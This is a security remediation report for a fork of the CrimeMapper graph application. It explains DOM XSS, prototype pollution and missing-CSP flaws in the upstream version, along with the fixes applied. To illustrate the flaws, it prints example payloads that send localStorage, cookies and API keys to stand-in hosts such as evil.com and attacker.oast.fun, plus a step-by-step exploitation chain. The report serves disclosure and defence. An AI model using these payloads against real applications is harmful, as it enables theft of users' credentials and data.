# CrimeMapper Security Remediation Report

**Date:** 2026-01-17
**Affected:** [mr-r3b00t/crime-mapper](https://github.com/mr-r3b00t/crime-mapper) (upstream)
**Fixed In:** This fork ([Splinters-io/crime-mapper](https://github.com/Splinters-io/crime-mapper))

---

## Executive Summary

This document details critical security vulnerabilities discovered in the CrimeMapper application. The **upstream version remains vulnerable** to multiple attack vectors that allow an attacker to steal API keys (Shodan, IPInfo, GreyNoise, URLScan, SecurityTrails) stored in the user's browser.

**Attack Chain:** Attacker sends victim a malicious Nmap XML or JSON file → Victim imports it → XSS executes → API keys exfiltrated to attacker-controlled server.

---

## Vulnerabilities in Upstream (Unfixed)

The following vulnerabilities exist in the original [mr-r3b00t/crime-mapper](https://github.com/mr-r3b00t/crime-mapper) repository:

| ID | Vulnerability | Severity | CWE | Demonstrable PoC |
|----|---------------|----------|-----|------------------|
| 1 | DOM XSS via vis-network Tooltips | **Critical** | CWE-79 | `PoC/malicious_nmap_exfil.xml` |
| 2 | DOM XSS via Inline onclick Handlers | **Critical** | CWE-79 | `PoC/05_context_menu_quote_breakout.json` |
| 3 | DOM XSS via innerHTML | **High** | CWE-79 | `PoC/01_contact_email_xss.json` |
| 4 | Prototype Pollution via Object.assign | **High** | CWE-1321 | `PoC/11_prototype_pollution.json` |
| 5 | Missing Content Security Policy | **Critical** | CWE-1021 | All exfil PoCs work due to no CSP |
| 6 | No Import Validation/Warning | **Medium** | CWE-352 | Social engineering + any PoC |

### Proof of Concept Files

| File | Attack Vector | Impact |
|------|---------------|--------|
| `malicious_nmap_scan.xml` | Nmap XML import → hostname field | `alert('XSS!')` popup |
| `malicious_nmap_exfil.xml` | Nmap XML import → hostname field | **Exfiltrates all API keys as hex** |
| `01_contact_email_xss.json` | JSON import → contact email | localStorage exfil |
| `02_ip_notes_xss.json` | JSON import → IP notes | Shodan API key exfil |
| `03_organization_xss.json` | JSON import → org name | Multi-key exfil |
| `04_domain_chunked_exfil.json` | JSON import → domain | Chunked exfil (large data) |
| `05_context_menu_quote_breakout.json` | Right-click context menu | JS string breakout |
| `06_favicon_hash_xss.json` | JSON import → favicon hash | Cookie exfil |
| `12_persistent_xss_localstorage.json` | JSON import → contact | **Persistent beacon every 30s** |

### Exploitation Steps (Upstream)

```
1. Attacker generates malicious Nmap XML:      PoC/malicious_nmap_exfil.xml

2. Attacker sends to victim (email, Slack, shared drive, etc.)

3. Victim opens CrimeMapper and clicks "Import Nmap XML"

4. Victim selects the malicious file

5. Victim hovers over node "10.0.0.99"

6. XSS executes silently:
   - Reads localStorage (contains API keys)
   - Formats as: shodan:KEY,ipinfo:KEY,greynoise:KEY,...
   - Hex encodes the data
   - Sends to: https://attacker.oast.fun?yoink=<hex>

7. Attacker decodes hex and has victim's API keys
```

### Decode Exfiltrated Data

```bash
# Hex decode
echo "73686f64616e3a414243313233" | xxd -r -p
# Output: shodan:ABC123
```

---

## Remediation Applied (This Fork)

This fork contains fixes for all identified vulnerabilities:

| Vulnerability | Fix Applied |
|---------------|-------------|
| DOM XSS (tooltips) | `Security.encodeHTML()` on all user data |
| DOM XSS (onclick) | Event delegation pattern, no inline handlers |
| DOM XSS (innerHTML) | Replaced with `textContent` / DOM methods |
| Prototype Pollution | `FORBIDDEN_KEYS` filter on object merges |
| Missing CSP | Added strict `connect-src` whitelist |
| No Import Warning | User confirmation dialog before import |

---

## Detailed Vulnerability Analysis

### 1. DOM-Based XSS via vis-network Tooltips

**Severity:** Critical
**CWE:** [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
**OWASP:** [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/)

#### What Was Wrong

The vis-network library renders the `title` property as HTML for node tooltips. User-controlled data was interpolated directly into title strings without encoding:

```javascript
// VULNERABLE CODE
title: v => `Contact\nName: ${v.name}\nEmail: ${v.email}`
```

An attacker could import a malicious graph file with XSS payloads:

```json
{
  "nodes": [{
    "type": "contact",
    "name": "Test",
    "email": "<img src=x onerror=\"fetch('https://evil.com?'+btoa(localStorage))\">"
  }]
}
```

When the user hovers over the node, the payload executes and exfiltrates API keys.

#### The Fix

All user data in title functions is now HTML-encoded using `Security.encodeHTML()`:

```javascript
// FIXED CODE (line 4504+)
const e = Security.encodeHTML;
title: v => `Contact<br>Name: ${e(v.name)}${v.email ? '<br>Email: ' + e(v.email) : ''}`
```

#### Why This Works

HTML entity encoding converts dangerous characters to their safe equivalents:
- `<` becomes `&lt;`
- `>` becomes `&gt;`
- `"` becomes `&quot;`

The browser displays these as literal text, not executable HTML.

#### References
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)

---

### 2. DOM-Based XSS via Inline Event Handlers

**Severity:** Critical
**CWE:** [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

#### What Was Wrong

Context menus used inline `onclick` handlers with string interpolation:

```javascript
// VULNERABLE CODE
menuHtml += `<button onclick="enrichShodan('${nodes.get(id).ip}')">Enrich</button>`;
```

If a node's IP field contained `'); alert(1); //`, the attacker could break out of the string and execute arbitrary JavaScript.

#### The Fix

Replaced inline handlers with event delegation pattern (lines 2720-2984):

```javascript
// FIXED CODE
const btn = document.createElement('button');
btn.textContent = 'Enrich via Shodan';
btn.dataset.action = 'enrichShodan';
btn.dataset.nodeId = String(id);  // Data stored safely in attribute
menu.appendChild(btn);

// Single delegated handler
menu.addEventListener('click', function(e) {
    const btn = e.target.closest('button[data-action]');
    if (!btn) return;

    switch(btn.dataset.action) {
        case 'enrichShodan':
            throttledEnrichShodanMultiple(parseData('values'), parseData('nodeIds'));
            break;
    }
});
```

#### Why This Works

1. **No string interpolation in JS context** - Data is stored in `data-*` attributes, which are always treated as strings
2. **Event delegation** - Single handler on parent element, no inline handlers
3. **Separation of data and code** - User data never becomes part of executable code

#### References
- [OWASP DOM-Based XSS Prevention - Rule #3](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#rule-3---use-safe-javascript-functions-or-properties-to-populate-the-dom)
- [JavaScript Event Delegation Pattern](https://developer.mozilla.org/en-US/docs/Learn/JavaScript/Building_blocks/Events#event_delegation)

---

### 3. XSS via innerHTML with User Data

**Severity:** High
**CWE:** [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)

#### What Was Wrong

Properties panel and graph summary used `innerHTML` with user-controlled data:

```javascript
// VULNERABLE CODE
row.innerHTML = `<td>${key}</td><td>${value}</td>`;
```

#### The Fix

Replaced with safe DOM methods (lines 6354, 7255):

```javascript
// FIXED CODE
const td1 = document.createElement('td');
td1.textContent = key;  // textContent is always safe
const td2 = document.createElement('td');
td2.textContent = String(value);
row.appendChild(td1);
row.appendChild(td2);
```

#### Why This Works

`textContent` and `innerText` treat content as literal text, never parsing HTML. This is the safest way to insert user-controlled data into the DOM.

#### References
- [MDN: textContent vs innerHTML](https://developer.mozilla.org/en-US/docs/Web/API/Node/textContent#differences_from_innerhtml)
- [OWASP: Safe Sinks](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html#safe-sinks)

---

### 4. Prototype Pollution via Object.assign

**Severity:** High
**CWE:** [CWE-1321: Improperly Controlled Modification of Object Prototype Attributes](https://cwe.mitre.org/data/definitions/1321.html)

#### What Was Wrong

User-provided objects were merged directly using `Object.assign()`:

```javascript
// VULNERABLE CODE
Object.assign(nodeData, allValues);
```

An attacker could inject `__proto__` or `constructor` properties to pollute the JavaScript prototype chain:

```json
{
  "nodes": [{
    "__proto__": { "isAdmin": true },
    "type": "contact"
  }]
}
```

#### The Fix

1. **Sanitization function** that filters dangerous keys (line 1454):

```javascript
const FORBIDDEN_KEYS = Object.freeze([
    '__proto__', 'constructor', 'prototype',
    '__defineGetter__', '__defineSetter__',
    '__lookupGetter__', '__lookupSetter__'
]);

function sanitizeObject(obj, depth = 0, maxDepth = 10) {
    // ... recursive sanitization
    for (const key of Object.keys(obj)) {
        if (FORBIDDEN_KEYS.includes(key)) {
            console.warn(`Security: Blocked forbidden key "${key}"`);
            continue;
        }
        clean[key] = sanitizeObject(obj[key], depth + 1, maxDepth);
    }
    return clean;
}
```

2. **Safe property assignment** (line 4670):

```javascript
// FIXED CODE
for (const [key, value] of Object.entries(allValues)) {
    if (!Security.FORBIDDEN_KEYS.includes(key)) {
        nodeData[key] = value;
    }
}
```

#### Why This Works

By explicitly filtering out prototype-related keys before assignment, we prevent attackers from modifying the prototype chain. Using `Object.create(null)` for clean objects also removes the prototype chain entirely.

#### References
- [Snyk: Prototype Pollution](https://learn.snyk.io/lesson/prototype-pollution/)
- [OWASP: Prototype Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Prototype_Pollution)

---

### 5. Data Exfiltration via Missing CSP

**Severity:** Critical
**CWE:** [CWE-1021: Improper Restriction of Rendered UI Layers or Frames](https://cwe.mitre.org/data/definitions/1021.html)
**OWASP:** [A05:2021 - Security Misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/)

#### What Was Wrong

No Content Security Policy was present. Even with XSS protections, if an attacker found a bypass, they could freely exfiltrate data:

```javascript
// Attacker's payload could send data anywhere
fetch('https://evil.oast.fun?data=' + btoa(localStorage));
new Image().src = 'https://evil.oast.fun/' + btoa(document.cookie);
```

#### The Fix

Added comprehensive CSP meta tag (lines 6-29):

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' 'unsafe-inline' https://unpkg.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    connect-src 'self'
        https://ipinfo.io
        https://api.shodan.io
        https://internetdb.shodan.io
        https://api.greynoise.io
        https://urlscan.io
        https://mb-api.abuse.ch
        https://urlhaus-api.abuse.ch
        https://dns.google
        https://cavalier.hudsonrock.com
        https://api.securitytrails.com
        localhost:* 127.0.0.1:*;
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
">
```

#### Why This Works

| Directive | Protection |
|-----------|------------|
| `connect-src` whitelist | Blocks fetch/XHR to non-whitelisted domains |
| `img-src 'self' data: blob:` | Blocks image-based exfiltration (`<img src="https://evil.com/...">`) |
| `frame-src 'none'` | Prevents iframe injection |
| `object-src 'none'` | Blocks plugin-based attacks |
| `base-uri 'self'` | Prevents base tag hijacking |

Even if XSS executes, the browser blocks outbound requests to unauthorized domains.

#### References
- [MDN: Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

### 6. CSRF-Like Attack via Malicious File Import

**Severity:** Medium
**CWE:** [CWE-352: Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

#### What Was Wrong

Users could be tricked into importing malicious graph files without warning. Social engineering combined with XSS payloads allowed full compromise.

#### The Fix

Added user confirmation dialog before import (line 7664):

```javascript
function importGraph() {
    const confirmed = confirm(
        'Security Warning: Importing graph files from untrusted sources may be risky.\n\n' +
        'Only import files you created yourself or received from trusted sources.\n\n' +
        'Do you want to continue?'
    );
    if (!confirmed) {
        showToast('Import cancelled', 'info');
        return;
    }
    // ... proceed with import
}
```

#### Why This Works

User awareness is a critical layer of defense. The warning:
1. Interrupts the attack flow
2. Gives users a chance to reconsider
3. Establishes that imported files can be dangerous

#### References
- [OWASP: Social Engineering](https://owasp.org/www-community/Social_Engineering)
- [Defense in Depth](https://www.cisa.gov/sites/default/files/publications/defense_in_depth_0.pdf)

---

### 7. JavaScript Runtime Errors

**Severity:** Low (Functional Bug)

#### handleMouseDown Not Defined

Dead code referencing undefined event handlers was removed (line 2237):

```javascript
// REMOVED - these functions don't exist
container.addEventListener('mousedown', handleMouseDown);
container.addEventListener('mousemove', handleMouseMove);
container.addEventListener('mouseup', handleMouseUp);
```

#### fileInput is Null

The import function now creates file input dynamically instead of querying a non-existent DOM element (line 7675):

```javascript
// FIXED - create dynamically
const fileInput = document.createElement('input');
fileInput.type = 'file';
fileInput.accept = '.json';
```

---

## Security Module

A centralized security module was added (lines 1397-1555) providing:

| Function | Purpose |
|----------|---------|
| `Security.encodeHTML(input)` | HTML entity encoding for XSS prevention |
| `Security.encodeJS(input)` | JavaScript string encoding |
| `Security.sanitizeObject(obj)` | Deep object sanitization with prototype pollution protection |
| `Security.sanitizeNode(node)` | Node-specific field encoding |
| `Security.FORBIDDEN_KEYS` | Blocklist for prototype pollution |

### Usage Example

```javascript
// Before (vulnerable)
title: v => `Contact: ${v.name}`

// After (safe)
const e = Security.encodeHTML;
title: v => `Contact: ${e(v.name)}`
```

---

## Testing the Fixes

### XSS Payload Test

```javascript
// These payloads are now neutralized
const payloads = [
    '<img src=x onerror="alert(1)">',
    '<svg onload="fetch(\'https://evil.com\')">',
    '<script>document.cookie</script>'
];

payloads.forEach(p => {
    console.log(Security.encodeHTML(p));
    // Output: &lt;img src&#x3D;x onerror&#x3D;&quot;alert(1)&quot;&gt;
});
```

### CSP Violation Test

Open browser console and attempt:
```javascript
fetch('https://evil.oast.fun');
// Result: Refused to connect to 'https://evil.oast.fun' because it
// violates the Content-Security-Policy directive
```

---

## References & Further Reading

### OWASP Resources
- [OWASP Top 10 2021](https://owasp.org/Top10/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

### CWE References
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-1321: Prototype Pollution](https://cwe.mitre.org/data/definitions/1321.html)
- [CWE-352: CSRF](https://cwe.mitre.org/data/definitions/352.html)

### Additional Resources
- [PortSwigger: DOM-Based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)
- [Snyk: Prototype Pollution](https://learn.snyk.io/lesson/prototype-pollution/)
- [Google: CSP Evaluator](https://csp-evaluator.withgoogle.com/)

---

## Conclusion

The CrimeMapper application now implements defense-in-depth with multiple security layers:

1. **Input Encoding** - All user data HTML-encoded before display
2. **Safe DOM APIs** - Using `textContent` and DOM creation instead of `innerHTML`
3. **Event Delegation** - No inline event handlers with interpolated data
4. **Prototype Pollution Protection** - Blocklist filtering on object merges
5. **Content Security Policy** - Restricts data exfiltration even if XSS occurs
6. **User Warnings** - Confirmation before importing potentially malicious files

These changes align with OWASP best practices and provide robust protection against the identified attack vectors.
